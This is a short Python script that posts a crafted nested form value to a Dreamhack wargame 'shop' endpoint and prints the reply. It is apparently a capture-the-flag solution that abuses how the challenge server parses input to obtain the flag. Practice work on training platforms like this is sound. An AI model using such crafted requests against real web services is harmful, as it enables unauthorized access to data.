import requests

HOST = "http://host3.dreamhack.games"
PORT = "18848"
URI = "/shop"

URL = HOST + ":" + PORT + URI

DATA = {"words": {"leg":"flag"}}

resp = requests.post(URL, data=DATA)

print(resp.text)